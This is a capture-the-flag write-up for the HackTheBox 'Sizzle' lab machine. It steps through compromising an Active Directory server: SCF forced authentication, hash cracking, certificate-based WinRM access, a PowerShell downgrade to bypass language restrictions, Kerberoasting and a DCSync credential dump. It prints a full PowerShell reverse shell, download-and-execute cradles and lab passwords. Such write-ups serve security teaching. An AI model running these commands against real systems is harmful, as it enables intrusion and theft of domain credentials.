# HackTheBox-Sizzle

## NMAP

```bash
Nmap scan report for 10.129.158.103
Host is up (0.15s latency).                                                     
Not shown: 65507 filtered ports                                        
PORT      STATE SERVICE       VERSION                                 
21/tcp    open  ftp           Microsoft ftpd                           
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)                 
| ftp-syst:                                                            
|_  SYST: Windows_NT                                                   
53/tcp    open  domain?                                                
| fingerprint-strings:                                                 
|   DNSVersionBindReqTCP:                                              
|     version                                                          
|_    bind                                                             
80/tcp    open  http          Microsoft IIS httpd 10.0                      
| http-methods:                                                        
|   Supported Methods: OPTIONS TRACE GET HEAD POST     
|_  Potentially risky methods: TRACE                                   
|_http-server-header: Microsoft-IIS/10.0                         
135/tcp   open  msrpc         Microsoft Windows RPC                    
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn            
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername:<unsupported>, DNS:sizzle.HTB.LOCAL
| Issuer: commonName=HTB-SIZZLE-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-02-11T12:59:51
| Not valid after:  2022-02-11T12:59:51
| MD5:   6346 07e3 ae83 0744 681e 3c0b 00ff 80d9
|_SHA-1: e071 44af 92c6 e202 8f21 0fc6 c9c7 433b 360b e3a9
|_ssl-date: 2022-01-31T15:25:38+00:00; 0s from scanner time.
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
| ssl-cert: Subject: commonName=sizzle.htb.local
| Issuer: commonName=HTB-SIZZLE-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-07-03T17:58:55
| Not valid after:  2020-07-02T17:58:55
| MD5:   240b 1eff 5a65 ad8d c64d 855e aeb5 9e6b
|_SHA-1: 77bb 3f67 1b6b 3e09 b8f9 6503 ddc1 0bbf 0b75 0c72
|_ssl-date: 2022-01-31T15:25:38+00:00; 0s from scanner time.
| tls-alpn: 
|   h2
|_  http/1.1
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername:<unsupported>, DNS:sizzle.HTB.LOCAL
| Issuer: commonName=HTB-SIZZLE-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-02-11T12:59:51
| Not valid after:  2022-02-11T12:59:51
| MD5:   6346 07e3 ae83 0744 681e 3c0b 00ff 80d9
|_SHA-1: e071 44af 92c6 e202 8f21 0fc6 c9c7 433b 360b e3a9
|_ssl-date: 2022-01-31T15:25:38+00:00; 0s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername:<unsupported>, DNS:sizzle.HTB.LOCAL
| Issuer: commonName=HTB-SIZZLE-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-02-11T12:59:51
| Not valid after:  2022-02-11T12:59:51
| MD5:   6346 07e3 ae83 0744 681e 3c0b 00ff 80d9
|_SHA-1: e071 44af 92c6 e202 8f21 0fc6 c9c7 433b 360b e3a9
|_ssl-date: 2022-01-31T15:25:38+00:00; -1s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername:<unsupported>, DNS:sizzle.HTB.LOCAL
| Issuer: commonName=HTB-SIZZLE-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-02-11T12:59:51
| Not valid after:  2022-02-11T12:59:51
| MD5:   6346 07e3 ae83 0744 681e 3c0b 00ff 80d9
|_SHA-1: e071 44af 92c6 e202 8f21 0fc6 c9c7 433b 360b e3a9
|_ssl-date: 2022-01-31T15:25:38+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername:<unsupported>, DNS:sizzle.HTB.LOCAL
| Issuer: commonName=HTB-SIZZLE-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-02-11T12:59:51
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49695/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
49701/tcp open  msrpc         Microsoft Windows RPC
49702/tcp open  msrpc         Microsoft Windows RPC
49720/tcp open  msrpc         Microsoft Windows RPC

```

## PORT 21 (FTP)
Seeing ftp running we can check for anonymous login which was allowed but there wasn't anything there

<img src="https://i.imgur.com/A7uQFRZ.png"/>

## PORT 80 (HTTP)

Visiting port 80 we see an image of a sizzle 

<img src="https://i.imgur.com/xEuG5c5.png"/>

Running `gobuster` we get `/certenroll` but that gives a forbidden status

<img src="https://i.imgur.com/uGAaBCe.png"/>

<img src="https://i.imgur.com/358cev7.png"/>

## PORT 139/445 (SMB)
We can try to run `enum4linux` which is used to enumerate smb shares to gather information about operating system , listing shares and if possible will try to gather usernames from LDAP and RPC

<img src="https://i.imgur.com/1NZZLbQ.png"/>

Nothing interesting so running `smbclient` we do see some shares as null authentication

<img src="https://i.imgur.com/VFt8aSH.png"/>

However if we look the permissions using `smbmap` we are not allowed to access any shares

<img src="https://i.imgur.com/FklKVMe.png"/>

But still we can access one share that is `Department Shares`

<img src="https://i.imgur.com/fji3fOA.png"/>

We can further see some user's directories but all of them were empty

<img src="https://i.imgur.com/U5mVq6E.png"/>

Since we can't see port 88 (kerberos) to accessible to use these usernames are useless , if kerberos was accessible to use we could have tried AS-REP roasting , navigating to 
`Public` folder , it's empty too but we can write files in that directory 

<img src="https://i.imgur.com/uS7hrOR.png"/>

<img src="https://i.imgur.com/LQCb2WE.png"/>
 
 And after a few minutes the file gets dissapearred , could be that the file is being accessed in some way so this is where windows forced authentication attacks comes in , since we can upoad files , uploading a file with `.scf` extension would allow us to make windows retrieve an icon file from our fake smb share 
 
 https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/
 
 ```bash
[Shell]
Command=2
IconFile=\\10.10.14.58\uwu\uwu.ico
[Taskbar]
Command=ToggleDesktop
 ```
 
 And name the file `@anything.scf` , we used `@` as we want this file to be listed on the top
 
 <img src="https://i.imgur.com/Cepr9jY.png"/>
 
 Now running `responder` to catch NTLMv2 hash
 
 <img src="https://i.imgur.com/GSoXrib.png"/>
 
 <img src="https://i.imgur.com/kSmHSGW.png"/>
 
 Cracking the hash using `hashcat`
 
 <img src="https://i.imgur.com/dyxUFKX.png"/>
 
 <img src="https://i.imgur.com/ocH09vs.png"/>
 
 But we only get access to smb service
 
 <img src="https://i.imgur.com/GEVwvzg.png"/>

Running smbmap again with amanda user we can see that `CertEnroll` has read access rights

<img src="https://i.imgur.com/E14Lq0I.png"/>

Downloading all files from the certEnroll share

<img src="https://i.imgur.com/IlQbPYz.png"/>

The smb share has a description of `Active Directory Services` so could be that we need to deal with certificates , so visiting `certsrv` which is for requesting certificates in an AD 

<img src="https://i.imgur.com/nLgDpn6.png"/>

It asks for credentials but we already have got amanda's creds so we'll just use that

<img src="https://i.imgur.com/65I0RkQ.png"/>

Here we can see that there's an option to request for a certificate

<img src="https://i.imgur.com/OMwpgxN.png"/>

But this probably wasn't making any sense to me so visiting this link , it made something clear that ADCS allows you to generate certificate which would make you an authorized user to access internal assests and it could allow to access a service or a rdp connection

https://www.thesecmaster.com/how-to-request-a-certificate-from-windows-adcs/

So before requesting a certificate from ADCS we need to generate a CSR (Certificate Signing Request) file which is basically a signing request for CA (Certificate Authority) that will issue us a certificate considered as a trusted third party , so to generate it we can use `openssl` 

https://www.tecmint.com/generate-csr-certificate-signing-request-in-linux/

```bash
openssl req -new -newkey rsa:2048 -nodes -keyout arz.key -out arz.csr
```

<img src="https://i.imgur.com/wmz4rVV.png"/>

<img src="https://i.imgur.com/5LRmuNF.png"/>

Now that we have a csr file , we need to request for a certificate through this

<img src="https://i.imgur.com/ZaRW94F.png"/>

<img src="https://i.imgur.com/qosoqDM.png"/>

We need to download the certificate in DER format and we could then read the certificate as well

```bash
openssl x509 -inform der -in certnew.cer -noout -text
```

<img src="https://i.imgur.com/PZig1uh.png"/>

Now we need to use this certificate against WinRM but evil-winrm doesn't have this option so we need to use this ruby script to connect to winrm service using the certificate on port 5986

<img src="https://i.imgur.com/v9GVLa7.png"/>

https://github.com/Alamot/code-snippets/blob/master/winrm/winrm_shell.rb

<img src="https://i.imgur.com/zrxKEEl.png"/>

So our script will look like this 

```ruby
require 'winrm'

conn = WinRM::Connection.new(
  endpoint: 'https://10.129.157.36:5986/wsman',
  transport: :ssl,
  :client_cert => 'cert.cer',
  :client_key => 'arz.key',
  user: 'amanda',
  password: 'Ashare1972',
  :no_ssl_peer_verification => true
  
)

command=""

conn.shell(:powershell) do |shell|
    until command == "exit\n" do
        print "PS > "
        command = gets
        output = shell.run(command) do |stdout, stderr|
            STDOUT.print stdout
            STDERR.print stderr
        end
    end
    puts "Exiting with code #{output.exitcode}"
end

```

<img src="https://i.imgur.com/RQk4aV5.png"/>

Running the script with `ruby`

<img src="https://i.imgur.com/JxPsgZG.png"/>

In Users directory we see another user named `mrlky` but we didn't have permission to view it's content , didn't even have permissions to view contents of other directories and there wasn't anything interesting in other directories as well

<img src="https://i.imgur.com/vSafNmP.png"/>

So I decided to enumerate the AD using python bloodhound which works on LDAP and gather infomration regarding users ,groups , gpo's and etc in the domain

<img src="https://i.imgur.com/XbTfSSU.png"/>

```bash
python3 bloodhound.py -d HTB.local -u 'Amanda' -p 'Ashare1972' -c all -ns 10.129.158.71
```

We'll get four json files which we need to pass it on to bloodhound GUI

<img src="https://i.imgur.com/WgGwIi6.png"/>

<img src="https://i.imgur.com/E4Kj50K.png"/>

After loading the json file in bloodhound , let's to run pre-build queries

<img src="https://i.imgur.com/B5jig0e.png"/>

So a query for domain admin run this means that we have the information about the AD on the machine

Using the query for Kerberoastable Accounts we see user `MRLKY`

<img src="https://i.imgur.com/D8E1own.png"/>

And that user has DCSync rights meaning that through this account we can request data from domain controller , the data we usually retrieve from DC is the NTDS.dit file which contains all domain users hashes

<img src="https://i.imgur.com/PW1H8oJ.png"/>

But issue here is that port 88 isn't exposed externally , meaning that we can't connect to kerberos from our host machine so we may need to do portforwarding in order access kerberos or we can try to import `PowerView` or `AD-Module` which is a powershell module through which we can  perform AD enumeration and kerberoasting

So when downloading the powershell module through `IEX` which allows to load the powershell script in the memory without saving it on hard disk it gave an error "Cannot create type. Only core types are supported in this language mode."

```powershell
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.55:2222/PowerView.ps1');
```

<img src="https://i.imgur.com/BnqEUie.png"/>

Searching for this error I found something related to this that there's a securtiy policy for powershell and it is set to `ConstrainedLanguage` which will block some cmdlets to be executed like downloading a file or loading the powershell script

https://cyberark-customers.force.com/s/article/language-mode-error

<img src="https://i.imgur.com/CYKMvuf.png"/>

Googling about bypassing this , I found an article which suggested that downgrading powershell would bypass it 

https://www.ired.team/offensive-security/code-execution/powershell-constrained-language-mode-bypass

So checking the current version of powershell we have here is 5.1.14393.2636 

<img src="https://i.imgur.com/8Y0cR3p.png"/>

Now spawning powershell version 2 and checking if it has security policies or not 

<img src="https://i.imgur.com/JP8il2S.png"/>

It shows `FullLanguage` meaning that we can execute any cmdlets as there's no restriction on it 

```powershell
powershell -version 2 -c "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.55:2222/PowerView.ps1');"
```

<img src="https://i.imgur.com/E4YR7Wh.png"/>

This downloaded the powershell script , so let's see if we can use any of the cmdlets of PowerView module

<img src="https://i.imgur.com/aHvLsP3.png"/>

Even tho we had bypassed powershell security policy but still we cannot run commands from PowerView so try let's using `Rubueus` that is an executable which we can perform kerberoasting 

<img src="https://i.imgur.com/OP1NLyI.png"/>

But running this exe will again throw an error that it is blocked  by group policy 

<img src="https://i.imgur.com/bC0leSX.png"/>

The exe is getting blocked because of `AppLocker being` used , now to check the status of AppLocker which essentially tell windows to allow or deny users to run any executables or files

<img src="https://i.imgur.com/RHpLtAp.png"/>

We can see that a rule is being used if any rule  wasn't being used it would have shown us blank in the rule section ,  so looking for Applocker bypasses I found a github repo for generating metasploiy payloads that can bypass Applocker

https://github.com/GreatSCT/GreatSCT

Setting up GreatSCT

<img src="https://i.imgur.com/K9j9a4i.png"/>

I gaveup on this tool as it was taking a long time to install and realized that we can still run powershell cmdlets by first gettting a revershell through powershell version 2

```powershell
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.55",3333);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

```

```powershell
Invoke-WebRequest http://10.10.14.55:2222/powershell_rev.ps1 -outfile shell.ps1

powershell -version 2 -nop -nop -noexit -exec bypass -c '.\shell.ps1'
```

<img src="https://i.imgur.com/kI0rj4Y.png"/>

We can verify it as well that we have a reverse shell as powershell version 2

<img src="https://i.imgur.com/cxk7A1W.png"/>

Now when we try to load powerview through IEX and run cmdlets they will get executed

<img src="https://i.imgur.com/8mqGJFe.png"/>

First I tried to use `AutoKerberoast.ps1` to get TGS for mrlky but it failed 

<img src="https://i.imgur.com/gn5qSAs.png"/>

Using powerview's `Invoke-UserImpersonation` cmdlet it impersontated mrlky token so that we can then perform keberoast to get TGS

https://powersploit.readthedocs.io/en/latest/Recon/Invoke-UserImpersonation/

```powershell
$Password = ConvertTo-SecureString 'Ashare1972' -AsPlainText -Force

$Cred = New-Object System.Management.Automation.PSCredential('HTB.LOCAL\amanda', $Password)
```

<img src="https://i.imgur.com/UQjM5kk.png"/>

<img src="https://i.imgur.com/B0xtAHK.png"/>

Now we need to crack this ticket to get the password

<img src="https://i.imgur.com/gjCDeVc.png"/>

```bash
hashcat -a 0 -m 13100 hash2.txt /opt/SecLists/Passwords/rockyou.txt --force
```

<img src="https://i.imgur.com/O0x0ObM.png"/>

Now we don't we have to do anything crazy here , we don't even need a shell as mrlky user because from the bloodhound graph we saw that this user has DCsync rights so we can dump NTDS.dit but you may think that kerbeors is running locally on the machine but impacket's `secretsdump.py` works on rpc calls so you don't need to worry about having access to kerberos 

```bash
python3 secretsdump.py htb.local/mrlky:Football#7@10.129.158.71
```

<img src="https://i.imgur.com/ZzrDAnq.png"/>

We can now use either `smbexec.py` , `psexec.py` or `wmiexec.py` to get a shell as `NT AUTHORITY \ SYSTEM` or `Administrator`

<img src="https://i.imgur.com/bFduiTZ.png"/>

<img src="https://i.imgur.com/ySB45tU.png"/>

<img src="https://i.imgur.com/gBpVDmg.png"/>


 ## References
 
 - https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication
- https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/
- https://www.thesecmaster.com/how-to-request-a-certificate-from-windows-adcs/
- https://www.tecmint.com/generate-csr-certificate-signing-request-in-linux/
- https://serverfault.com/questions/215606/how-do-i-view-the-details-of-a-digital-certificate-cer-file
- https://github.com/Alamot/code-snippets/blob/master/winrm/winrm_shell.rb
- https://cyberark-customers.force.com/s/article/language-mode-error
- https://www.ired.team/offensive-security/code-execution/powershell-constrained-language-mode-bypass
- https://github.com/GreatSCT/GreatSCT
- https://powersploit.readthedocs.io/en/latest/Recon/Invoke-UserImpersonation/
